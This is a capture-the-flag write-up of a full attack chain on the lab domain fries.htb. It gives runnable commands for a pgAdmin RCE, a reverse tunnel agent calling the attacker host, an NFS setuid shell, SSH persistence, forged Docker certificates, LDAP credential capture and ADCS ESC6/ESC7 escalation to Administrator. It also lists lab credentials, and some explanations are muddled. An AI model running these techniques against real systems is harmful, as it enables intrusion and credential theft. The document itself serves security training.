Start IP-address: `10.129.244.72`
Start credentials: `d.cooper@fries.htb : D4LE11maan!!`
CTF - Insane difficulty 

**Reconnaissance** 

```
nmap --top-ports 10000 -sC -sV 10.129.244.72
```

It's Active Directory box 

Name of domain controller and domain. Added to `/etc/hosts` file
```
fries.htb
DC01.fries.htb
```

Non-Standart ports runned on DC

```
22/tcp    open  ssh 
80/tcp    open  http  nginx 1.18.0 (Ubuntu)
443/tcp   open  ssl/http  nginx 1.18.0 (Ubuntu)
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
2179/tcp  open  vmrdp?
```

clock-skew = 7h

```
sudo ntpdate dc01.fries.htb
```

`HTTP` port

In `/about` directory i found a possible usernames
```
Emma Thompson
Daniel Rodriguez
Sarah Chen
```

After crafting possible AD usernames and doing `AS-REP` no one was detected

Discovered a subdomain `code` , add to `/etc/hosts`

```
ffuf -u http://fries.htb/ -H "Host: FUZZ.fries.htb" -w /home/kali/wordlists/discovery/DNS/subdomains-top1million-20000.txt -fs 154
```

In this subdomain exists a `gitea` service , and we can log in with start creds

In app configuration (`README.md`) discovered a new subdomain ``db-mgmt05`` in which is ran a `pgAdmin 4` service database
For database view  `pgAdmin 4` i must have a `root` pass , i clone this repository to look up for commits

```
git log
git show be59cceb54b56f00778822395bdf656216ab4b9f
```

In intial commit i found a root pass for `postgresql` 

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

And with root credentials i logged in database `fries.htb` 

Version of `PgAdmin 4`  9.1 is vulnerable to `RCE` with `CVE-2025-2945` 
Impact:
Remote Code Execution security vulnerability in `pgAdmin 4`. The vulnerability is associated with the 2 POST endpoints; `/sqleditor/query_tool/download`, where the `query_commited` parameter and `/cloud/deploy` endpoint, where the high_availability parameter is unsafely passed to the Python eval() function, allowing arbitrary code execution. This issue affects `pgAdmin 4`: before 9.2.

I use a module in `matesploit` framework named as `multi/http/pgadmin_query_tool_authenticated`

![](images/Pasted image 20260214193002.png)

`Meterpreter` : 
![](images/Pasted image 20260214193037.png)

And we obtain remote code execution to linux host as `pgadmin`. After enumeration i mentioned that we are in `Docker Container` then i check an environment variables and found a password 

```
> env
Friesf00Ds2025!!
```

Also is interesting network in `ifconfig`

![](images/Pasted image 20260214211821.png)

So after tunneling we could have access to local network , i will use a `ligolo-proxy` . When the agent is delivered to target container:

Kali machine:
```
sudo ligolo-proxy -selfcert -laddr '10.10.15.225:443'
```

Target container:
```
./agent -connect 10.10.15.225:443 -retry -ignore-cert
```

Also remembering that i am in AD environment i ping a `DC` to know his interface
![](images/Pasted image 20260214212528.png)

So we got two interfaces in local network

```
192.168.100.0/24 # domain exists only 192.168.100.1
172.18.0.0/24 # containers
```


After simple enumeration with `nmap` and `ntx` i find a `NFS` ran in `172.18.0.1` host

![](images/Pasted image 20260214213707.png)

Shares:
![](images/Pasted image 20260214222316.png)

Checking a `NFS` shares i mentioned that there is mounted disk and probably for user `srv`
Mention that root escape in True it's a serious misconfiguration and we can download all files in mounted disk. `/etc/shadow` has `root` access.
![](images/Pasted image 20260214214720.png)

Main goal of this misconfig to create a new user and add him to `/etc/shadow` and `/etc/passwd` files.
Create a password hash:
```
openssl passwd -6 GreatPassword
```

![](images/Pasted image 20260214215736.png)
Now replace target files in system
![](images/Pasted image 20260214223909.png)

It's not worked because in `/etc/exports` we doesn't have a `no_root_squash`
![](images/Pasted image 20260214224006.png)

But i have an other trick in this situation . From `/etc/passwd` file we know what users exists in target system the most interesting is `svc` and `barmen` and i tried to brute-force a credentials with existing passwords by ssh connection and we are on

```
svc : Friesf00Ds2025!!
```

It's an initial foothold in domain but ONLY in ssh so we still need `barmen`

On `NFS` share `/srv/web.fries.htb/certs` we got some certificates
![](images/Pasted image 20260214225502.png)![](images/Pasted image 20260214225647.png)

And there nothing so the last trick it's to use this `NFS` share so first we need to create the same user as in target system second we need to mount `NFS` share in our kali machine.

User creation from `/etc/passwd` file taken from `NFS`
```
sudo useradd -r -u 117 -g 120 -c "Backup and Recovery Manager for PostgreSQL,,," -d /var/lib/barman -s /bin/bash barman
```

Mounting an `NFS` share to out computer
```
mount -t nfs 172.18.0.1:/srv/web.fries.htb /mnt/nfs
```

Also we get nothing if we want to copy a default `/bin/bash` because of different versions of `GLIBC` so i take a 

```
sudo apt install bash-static
```

And binary exists in:
```
/usr/bin/bash-static
```

The main goal to create a bash file in `NFS` directory and execute him on target system

File creation(Kali machine):
```
cp /usr/bin/bash-static shell
chmod +s shell
```

Execution(target machine):
```
./shell -p
```

All was done in directory
```
/srv/web.fries.htb/shared # target
/mnt/nfs/shared # kali machine
```

After shell execution we got a shell as `barmen`. We are `svc` but can do anything what `barmen` can do 
![](images/Pasted image 20260215002723.png)

Then i like to do `persistance` in target host. I create my own ssh key

Home `barman` directory
```
/var/lib/barman
```

Create ssh key(kali machine)
```
ssh-keygen -t rsa -b 4096
```

Permisions and creation(target)
```
mkdir .ssh
chmod 700 .ssh
echo 'ssh-rsa AAAAB <KEY> 4/AHSqXzVQ== kali@kali' >> .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

Log in
```
ssh barman@fries.htb -i id_rsa.barmen
```

Advantage of this that we are fully user `barman` via ssh
![](images/Pasted image 20260215005429.png)

Working with `NFS` again our goal in credentials in Active Directory environment and one thing that i mentioned it is certs directory in `NFS` share 
![](images/Pasted image 20260215012802.png)
Interesting group has access named as `Infra Managers` . Previously we discover what exists in this but directory.
In kali box i see that group which has access to `/certs` named as `59605603`
![](images/Pasted image 20260215013139.png)

So i can create this group and add myself , after copy all files

New group creation(kali box)
```
sudo groupadd -g 59605603 certgrp
```

Add myself
```
sudo usermod -aG 59605603 kali
```

Group activation
```
newgrp certgrp
```

id result
```
id
uid=1000(kali) gid=59605603(certgrp) groups=59605603(certgrp),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),107(bluetooth),114(kaboxer),115(wireshark),120(docker),1000(kali)
```

After copy all files 
```
kali /mnt/fries3/certs $ cp * /home/kali/htb/machines/Fries/certs 
```

This certificates in marked as `DockerCA` so probably certificates for a Docker containers so i can create self-signed certificate and get access to docker containers. To get access to docker we must tunnel `2376` to `localhost` we know that port is ran in target from 

```
ss -tnlp
LISTEN     0   4096    127.0.0.1:2376      0.0.0.0:*                        
```

Tunneling via ssh
```
ssh svc@fries.htb -L 2376:127.0.0.1:2376
```

Then we need to get access to docker container via new certificate generation

New cert generation
```
openssl genrsa -out certificate.pem 2048
```

And this will be a docker client's private key

Certificate Signing Request creation
```
openssl req -new \
  -key certificate.pem \
  -out client-certificate.csr \ 
  -subj "/CN=root"
```

Sign the client certificate using the daemon’s CA
```
openssl x509 -req \
  -in client-certificate.csr \ # created
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out cert.pem \
  -days 365 \
  -sha256
```

Validation
```
openssl x509 -in cert.pem -noout -text | grep -E "Issuer|Subject"

openssl verify -CAfile ca.pem cert.pem # CN=root
```

Next we must run a container `LOCALY` 
```
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=certificate.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Getting access to container
```
docker --tlsverify   --tlscacert=ca.pem  --tlscert=cert.pem --tlskey=certificate.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

![](images/Pasted image 20260215155402.png)

As we see there `https://pwm.fries.htb` 
![](images/Pasted image 20260215155502.png)

There are  configuration file for `LDAPS` connection if we change him to our IP-address and catch him by `responder` maybe we obtain new credentials

Config file searching
```
find / -type f -name 'PwmConfiguration.xml' 2>/dev/null
```

Location: `/config/PwmConfiguration.xml` 

![](images/Pasted image 20260215160832.png)

I modify file via `sed` because it contains error with `nano` and transferring
```
sed -i 's|ldaps://dc01.fries.htb:636|ldap://10.10.15.225:389|' PwmConfiguration.xml
```

Run `responder`
```
sudo responder -I tun0
```

And we catch a new clear-text credentials
![](images/Pasted image 20260215163753.png)

```
svc_infra : m6tneOMAh5p0wQ0d
```

And this credentials is valid for DC authentication 

![](images/Pasted image 20260215164140.png)

After access to domain `LDAP` i grep information by `bloodhound` 
```
bloodhound-python -d fries.htb  -u svc_infra -p m6tneOMAh5p0wQ0d -c all -dc dc01.fries.htb -ns 192.168.100.1
```

NOTE: It must be done through tunneling  

So during enumeration i found a machine account `gMSA_CA_prod$` and user `svc_infra` has privilege to read `GMSA` password 
```
nxc ldap dc01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d --gmsa
```

![](images/Pasted image 20260215172859.png)

New credentials:
```
gMSA_CA_prod$ :   :cb91dc519860daf4ccd15e89e5a9d5ad
```

Machine account `gMSA_CA_prod$` has `WinRM` to `DC`. Using Pass-The-Hash attack authorize by `WinRM`
![](images/Pasted image 20260215173138.png)


After simple enum i found a certificate vulnerability in system named
`ESC6 — EDITF_ATTRIBUTE SUBJECT ALTNAME 2`
Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.

Configuration with COM API(WinRM)

Using CertificateAuthority.Admin COM object
```
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
```

Calculate a new value and current value
```
$current = 1114446
$new = $current -bor 0x00040000
```

Apply modification 
```
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
```

Then restart CA service
```
Restart-Service certsvc -Force
```

Verify
```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```

![](images/Pasted image 20260216005318.png)

Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` = 40000 , means that it is **ENABLED**

**ESC6** allows specifying an arbitrary UPN for example `administrator@fries.htb` in the certificate so 
**ESC16** prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.

After this we run again `certipy-ad` and find a `ESC7` and `ESC16`
![](images/Pasted image 20260216010848.png)
```
certipy-ad find -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -vulnerable -target dc01.fries.htb
```

I use a `kerberos` authentication 
```
impacket-getTGT -hashes ':cb91dc519860daf4ccd15e89e5a9d5ad' fries.htb/gMSA_CA_prod$ -dc-ip 192.168.100.1
```

By `ESC7` - User has a dangerous permissions we can add officer to CA `fries-DC01-CA` by user `svc_infra` 
An officer (Certificate Manager) in Active Directory Certificate Services (AD CS) is a privileged role that can review, approve, deny, and issue certificate requests, effectively controlling the certificate issuance process of the Certification Authority.

```
certipy-ad ca -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -add-officer svc_infra -ca fries-DC01-CA -target dc01.fries.htb
```

Now user `svc_infra` 
![](images/Pasted image 20260216015702.png)

We cat try to request cert via `SubCA`
![](images/Pasted image 20260216020028.png)

This becomes a `ESC6` + `ESC7` certificate exploitation
##### **ESC6:**

It occurs when a misconfigured template, like ENROLLEE_SUPPLIES_SUBJECT, is accessible to low-privileged users, allowing exploitation without CA access.

##### **ESC7**:

The CA is misconfigured with ACLs (set via certsrv.msc), giving unprivileged users like svc_infra@fries.htb  rights such as ManageCA or ManageCertificates.


Request certificate as administrator
```
certipy-ad req -u svc_infra@fries.htb -p 'm6tneOMAh5p0wQ0d' -ca fries-DC01-CA -target 192.168.100.1 -template SubCA -upn administrator@ignite.local -dc-ip 192.168.100.1
```

Auth as administrator
```
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.100.1 
```

Creds
```
Administrator :  :a773cb05d79273299a684a23ede56748
```

![](images/Pasted image 20260216021842.png)
And in `C:\Users\Administrator\Desktop` directory exists `user.txt` and `root.txt` 

Thanks for reading 
See you soon

Colosion